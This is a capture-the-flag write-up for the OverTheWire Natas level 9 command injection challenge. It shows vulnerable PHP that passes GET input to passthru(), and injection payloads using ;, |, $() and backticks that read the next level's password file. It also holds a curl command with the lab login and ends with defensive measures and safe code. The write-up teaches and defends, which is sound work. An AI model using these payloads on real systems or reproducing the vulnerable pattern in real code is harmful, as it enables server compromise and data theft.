09 Command Injection — OS Command Execution Hard

// Key Concepts

Command Injection OS Command Execution Input Validation Shell Metacharacters Escape Characters

// Challenge Overview

This level presents a search form that allows users to search for words in a dictionary file. However, the application is vulnerable to Command Injection — it passes user input directly to a system command without proper sanitization.

// Initial Analysis

The page displays a search input and a note about a dictionary file. Viewing the source code reveals the vulnerability:

<?php $key = ""; if(array_key_exists("needle", $_GET)) { $key = $_GET["needle"]; } if($key != "") { passthru("grep -i " . $key . " dictionary.txt"); } ?>

The passthru() function executes a system command and outputs the result directly to the browser. The user input ($key) is concatenated directly into the command string.

💡 Command Injection occurs when an application passes unsafe user input to a system command. Attackers can inject additional commands using shell metacharacters like ;, |, &, ||, &&, and $().

// Understanding Command Injection

When user input is used in a system command, several characters have special meaning in the shell:

  • ; — Command separator (run multiple commands sequentially)
  • | — Pipe (send output of one command to another)
  • & — Run command in background
  • || — Logical OR (run second if first fails)
  • && — Logical AND (run second if first succeeds)
  • $() — Command substitution (execute command and use output)
  • ` — Backticks (command substitution)

The application's command:

grep -i [USER INPUT] dictionary.txt

If we enter hello; ls, the command becomes:

grep -i hello; ls dictionary.txt

This executes two commands:

  1. grep -i hello dictionary.txt — searches for "hello"
  2. ls — lists files in the current directory

// Solution Walkthrough

Step 1 — Test for Command Injection:

Try a simple command injection payload:

http://natas9.natas.labs.overthewire.org/?needle=hello; ls

If the output shows a directory listing, the injection was successful.

Step 2 — Find the Password File:

The passwords for each level are stored in /etc/natas_webpass/. Try to read the next level's password:

http://natas9.natas.labs.overthewire.org/?needle=; cat /etc/natas_webpass/natas10

Or using a different separator:

http://natas9.natas.labs.overthewire.org/?needle=hello | cat /etc/natas_webpass/natas10

Alternative payloads:

# List files in current directory ?needle=; ls -la # Read the password file ?needle=; cat /etc/natas_webpass/natas10 # Using pipe ?needle=| cat /etc/natas_webpass/natas10 # Using command substitution ?needle=$(cat /etc/natas_webpass/natas10) # Using backticks ?needle=`cat /etc/natas_webpass/natas10` # Multiple commands ?needle=; whoami; id; pwd

Using curl:

curl -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl \ "http://natas9.natas.labs.overthewire.org/?needle=; cat /etc/natas_webpass/natas10"

// Why It Works

The vulnerability exists because:

  • No input sanitization: User input is not filtered or escaped.
  • Direct command execution: The application uses passthru() with unsanitized input.
  • Shell interpretation: The shell interprets special characters as commands.
  • No escaping: The application does not escape shell metacharacters.

// The Impact of Command Injection

  • Read sensitive files: Access /etc/passwd, /etc/shadow, configuration files
  • Execute arbitrary commands: Run any system command with the web server's privileges
  • Reverse shell: Gain interactive access to the server
  • Data exfiltration: Extract sensitive data from the system
  • Privilege escalation: Escalate privileges if the web server runs as root
  • System compromise: Full system compromise is possible

// Defensive Measures

  • Never use user input directly in system commands.
  • Use whitelist validation — allow only specific, pre-approved values.
  • Use escapeshellarg() to escape user input for shell commands.
  • Use escapeshellcmd() to escape metacharacters.
  • Avoid using shell commands — use native PHP functions instead (e.g., grep → strpos() or preg_match()).
  • Run the web server with minimal privileges (not as root).
  • Use chroot or containerization to isolate the application.
  • Implement proper error handling to prevent information leakage.
  • Use input validation with a positive security model (allow only what is explicitly permitted).

// Secure Coding Example

✅ Safe approach (whitelist + escape):

<?php // Method 1: Whitelist $allowed = ['apple', 'banana', 'cherry']; $key = $_GET['needle'] ?? ''; if (in_array($key, $allowed)) { passthru("grep -i " . escapeshellarg($key) . " dictionary.txt"); } // Method 2: Use native PHP functions (preferred) $dictionary = file_get_contents('dictionary.txt'); if (strpos($dictionary, $key) !== false) { echo "Found!"; } ?>

⚠️ Never do this: passthru("grep -i " . $_GET['needle'] . " dictionary.txt");

// Key Takeaways

💻 Command Injection is Critical

Command injection can lead to full system compromise. Never pass user input to system commands without proper sanitization.

🛡️ Use Escaping Functions

If you must use system commands, always use escapeshellarg() and escapeshellcmd() to prevent injection.
